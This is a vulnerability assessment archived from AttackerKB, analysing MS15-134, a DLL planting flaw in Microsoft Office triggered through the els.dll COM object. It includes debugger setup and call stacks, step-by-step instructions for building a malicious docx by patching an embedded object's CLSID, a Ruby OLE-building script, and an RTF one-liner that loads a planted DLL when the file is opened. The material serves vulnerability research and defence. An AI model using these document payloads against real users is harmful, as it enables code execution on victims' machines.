---
title: MS15-134 Microsoft Office COM Object DLL Planting with els.dll
author: jvazquez-r7
score: 1
topic_attacker_value: 0
topic_exploitability: 0
topic_disclosure_date: '2015-12-09T11:59:00'
created: '2019-09-12T18:07:34.47609'
revision_date: '2020-02-13T17:12:13.773403'
assessment_id: 091c023c-bb06-44fe-b22e-4dd4c9545a5f
topic_id: 7386cfe2-88af-4e79-9d39-ed7781c607c8
topic_short_id: 2CzLlDiN1U
topic_slug: ms15-134-microsoft-office-com-object-dll-planting-with-els-dll
akb_topic_url: https://attackerkb.com/topics/2CzLlDiN1U/ms15-134-microsoft-office-com-object-dll-planting-with-els-dll
akb_assessment_url: https://attackerkb.com/topics/2CzLlDiN1U/ms15-134-microsoft-office-com-object-dll-planting-with-els-dll#091c023c-bb06-44fe-b22e-4dd4c9545a5f
---

# MS15-134 Microsoft Office COM Object DLL Planting with els.dll

*Assessment by jvazquez-r7, archived from [AttackerKB](https://attackerkb.com/topics/2CzLlDiN1U/ms15-134-microsoft-office-com-object-dll-planting-with-els-dll#091c023c-bb06-44fe-b22e-4dd4c9545a5f).*

---

## Details

This vulnerability was originally reported on Project Zero. A PoC is available from the website.
To analyze this PoC (on Windows), first let's set up our breakpoints (save the following as bp.txt):

```
bu kernel32!LoadLibraryW ".printf \"kernel32!LoadLibraryW loading %mu\n\n\", poi(esp+4); .echo; g"
bu kernel32!LoadLibraryA ".printf \"Kernel32!LoadLibraryA loading %ma\n\n\", poi(esp+4); .echo; g"
bu kernel32!LoadLibraryExW "r $t0=poi(esp+4); .printf \"Kernel32!LoadLibraryExW loading %mu\n\n\", @$t0; .echo; g"
sxe ld elsext.dll
```

Also, save the following script as run_windbg.bat (change the bp.txt path if needed):

```
cd "C:\Program Files\Debugging Tools for Windows (x86)"
windbg.exe -c "$$><C:\dev\bp.txt; g" "C:\Program Files\Microsoft Office\Office15\WINWORD.exe"
```

This allows us to debug more quickly with WinDBG.

Double-click on run_windbg.bat, it should start MSFT Office Word, and automatically attach WinDBG.

In office, open the PoC document, and then either one-click, or double click on the text file icon.
WinDBG should trigger a module-on-load breakpoint for elsext.dll, and you should have a callstack
that looks similar to:

```
ModLoad: 741e0000 741e6000   C:\Users\sinn3r\Desktop\elsext.dll
eax=00578b10 ebx=00000000 ecx=00000000 edx=006a26b8 esi=7ffde000 edi=005788f4
eip=77a470b4 esp=0057880c ebp=00578860 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
ntdll!KiFastSystemCallRet:
77a470b4 c3              ret
0:000> k
ChildEBP RetAddr
00578808 77a45c34 ntdll!KiFastSystemCallRet
0057880c 77a6067d ntdll!ZwMapViewOfSection+0xc
00578860 77a6075a ntdll!LdrpMapViewOfSection+0xc7
005788f8 77a5fbc1 ntdll!LdrpFindOrMapDll+0x303
00578a78 77a6232c ntdll!LdrpLoadDll+0x2b2
00578aac 75e188ee ntdll!LdrLoadDll+0x92
00578ae4 770d3c12 KERNELBASE!LoadLibraryExW+0x15a
00578af8 70263162 kernel32!LoadLibraryW+0x11
00578b34 70263383 els!IsolationAwareLoadLibraryW+0x35
00578b3c 702636f4 els!InitExtension+0xa
00578f8c 702533d1 els!InitGlobals+0x301
00578f90 70254377 els!CDll::AddRef+0xe
00578f98 70266ce1 els!CComponentDataCF::CComponentDataCF+0x10
00578fac 778eaec6 els!DllGetClassObject+0x77
00578fc8 778c91ed ole32!CClassCache::CDllPathEntry::DllGetClassObject+0x30 [d:\w7rtm\com\ole32\com\objact\dllcache.cxx @ 3324]
00578fe0 778c8eb2 ole32!CClassCache::CDllFnPtrMoniker::BindToObjectNoSwitch+0x1f [d:\w7rtm\com\ole32\com\objact\dllcache.cxx @ 3831]
00579018 778c8c57 ole32!CClassCache::GetClassObject+0x49 [d:\w7rtm\com\ole32\com\objact\dllcache.cxx @ 4582]
00579094 778e3170 ole32!CServerContextActivator::CreateInstance+0x110 [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 974]
005790d4 778c8dca ole32!ActivationPropertiesIn::DelegateCreateInstance+0x108 [d:\w7rtm\com\ole32\actprops\actprops.cxx @ 1917]
00579128 778c8d3f ole32!CApartmentActivator::CreateInstance+0x112 [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 2268]
```

This call stack confirms the unsafe DLL loading. It's almost the same as the one shown on Project
Zero, but PZ probably put a breakpoint on LoadLibrary and dumped the callstack that way, therefore
a little more info.

To create the PoC from scratch, here's how:

1. Prepare a elsext.dll. You can download this from Project Zero, or you should be able to run your
   own DLL.
2. Create a new document with Microsoft Office Word. Click on Insert -> Object -> Create from File ->
   select a text file (any text file should be fine), click on OK. And then save this document as
   docx.
3. Decompress the docx file. You can do this with 7zip.
4. In the decompressed folder, go to word -> embeddings, you should see an oleObject1.bin file.
5. Use lib/rex/ole/samples/ole_info.rb to inspect this oleObject1.bin file. Confirm that in the
   first directory entry, the CLSID is 0003000c-0000-0000-c000-000000000046 (the CLSID
   for embedded Packager; for system32\packager.dll). This is also the only dir entry with a
   CLSID.
6. Open a hex editor (such as 010 Editor), and modify the CLSID to 394c052e-b830-11d0-9a86-00c04fd8dbf7.
   The exact byte order is: ```2E 05 4C 39 30 B8 D0 11 9A 86 00 C0 4F D8 DB F7```
7. Save the modified oleObject1.bin file.
8. Replace the original oleObject1.bin with the modified one.
9. Package the docx again. This is done by selecting _rels, docProps, word, and [Content_Types].xml,
   right click, go to 7zip, and then click on "Add to something.zip".
10. You should now have a new zip file. Rename this to docx.
11. Make sure this is a valid docx file by opening it. MSFT Office Word should be able to open it
    without an error.

While attempting to build the PoC from scratch, I also tried to build the oleObject1.bin file
using the MSF OLE API:

```ruby
# -*- coding: binary -*-

msfbase = __FILE__
while File.symlink?(msfbase)
  msfbase = File.expand_path(File.readlink(msfbase), File.dirname(msfbase))
end

$:.unshift(File.expand_path(File.join(File.dirname(msfbase), '..', '..', 'lib')))
require 'msfenv'
require 'rex'
require 'rex/ole'

def create_ole
  ole_tmp = Rex::Quickfile.new('ole')
  stg = Rex::OLE::Storage.new(ole_tmp.path, Rex::OLE::STGM_WRITE)

  data = "\x01\x00\xfe\xff\x03\x0a\x00\x00\xff\xff\xff\xff\x0c\x00\x03\x00"
  data << "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\x0c\x00\x00\x00"
  data << "\x4f\x4c\x45\x20\x50\x61\x63\x6b\x61\x67\x65\x00\x00\x00\x00\x00"
  data << "\x08\x00\x00\x00\x50\x61\x63\x6b\x61\x67\x65\x00\xf4\x39\xb2\x71"
  data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  data << "\x00\x00\x03\x00\x0d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  data << "\x1a\x01\x00\x00\x02\x00\x74\x65\x73\x74\x2e\x74\x78\x74\x00\x43"
  data << "\x3a\x5c\x55\x73\x65\x72\x73\x5c\x73\x69\x6e\x6e\x33\x72\x5c\x44"
  data << "\x65\x73\x6b\x74\x6f\x70\x5c\x74\x65\x73\x74\x2e\x74\x78\x74\x00"
  data << "\x00\x00\x03\x00\x2c\x00\x00\x00\x43\x3a\x5c\x55\x73\x65\x72\x73"
  data << "\x5c\x73\x69\x6e\x6e\x33\x72\x5c\x41\x70\x70\x44\x61\x74\x61\x5c"
  data << "\x4c\x6f\x63\x61\x6c\x5c\x54\x65\x6d\x70\x5c\x74\x65\x73\x74\x2e"
  data << "\x74\x78\x74\x00\x04\x00\x00\x00\x74\x65\x73\x74\x2b\x00\x00\x00"
  data << "\x43\x00\x3a\x00\x5c\x00\x55\x00\x73\x00\x65\x00\x72\x00\x73\x00"
  data << "\x5c\x00\x73\x00\x69\x00\x6e\x00\x6e\x00\x33\x00\x72\x00\x5c\x00"
  data << "\x41\x00\x70\x00\x70\x00\x44\x00\x61\x00\x74\x00\x61\x00\x5c\x00"
  data << "\x4c\x00\x6f\x00\x63\x00\x61\x00\x6c\x00\x5c\x00\x54\x00\x65\x00"
  data << "\x6d\x00\x70\x00\x5c\x00\x74\x00\x65\x00\x73\x00\x74\x00\x2e\x00"
  data << "\x74\x00\x78\x00\x74\x00\x08\x00\x00\x00\x74\x00\x65\x00\x73\x00"
  data << "\x74\x00\x2e\x00\x74\x00\x78\x00\x74\x00\x20\x00\x00\x00\x43\x00"
  data << "\x3a\x00\x5c\x00\x55\x00\x73\x00\x65\x00\x72\x00\x73\x00\x5c\x00"
  data << "\x73\x00\x69\x00\x6e\x00\x6e\x00\x33\x00\x72\x00\x5c\x00\x44\x00"
  data << "\x65\x00\x73\x00\x6b\x00\x74\x00\x6f\x00\x70\x00\x5c\x00\x74\x00"
  data << "\x65\x00\x73\x00\x74\x00\x2e\x00\x74\x00\x78\x00\x74\x00\x00\x00"

  directory = stg.instance_variable_get(:@directory)
  directory.each_entry do |entry|
    if entry.instance_variable_get(:@_ab) == 'Root Entry'
      # els
      # 394c052e-b830-11d0-9a86-00c04fd8dbf7
       clsid = Rex::OLE::CLSID.new("\x2e\x05\x4c\x39\x30\xb8\xd0\x11\x9a\x86\x00\xc0\x4f\xd8\xdb\xf7")
      entry.instance_variable_set(:@_clsId, clsid)

      stream = Rex::OLE::Stream.new(entry)
      stream << data
      stream.close
      stg.write_mini_stream(stream)
    end
  end

  stm = stg.create_stream("EPRINT")
  stm.close

  stm = stg.create_stream("CompObj")
  stm.close

  stm = stg.create_stream("ObjInfo")
  stm.close

  stm = stg.create_stream("Ole10Native")
  stm.close

  # write to disk
  stg.close

  ole_contents = File.read(ole_tmp.path)
  ole_tmp.close
  ole_tmp.unlink

  ole_contents
end


f = File.open('/tmp/ole.bin', 'wb')
f.write(create_ole)
f.close

puts "OlE created"
```

However, I never had much luck. Even though I don't have a corrupt docx (at least no complaints
from MSFT), elsext.dll wouldn't load. Currently unsure why.

BTW, lib/rex/ole/samples/ole_info.rb doesn't seem to be a good tool for inspecting an OLE object
file. A better tool seems to be [oletools](http://www.decalage.info/python/oletools).

Another way to load the DLL is having the following as a RTF document. This should trigger the load
as soon as the document is opened:

```
{\rtf1{\object\objemb{\*\objclass None}{\*\oleclsid \'7b394c052e-b830-11d0-9a86-00c04fd8dbf7\'7d}{\*\objdata 010500000100000001000000000000000000000000000000000000000000000000000000000000000000000000}}}
```

The above RTF can also be embedded in a docx as an object, but requires extra user interaction
(double-click) to trigger the DLL.
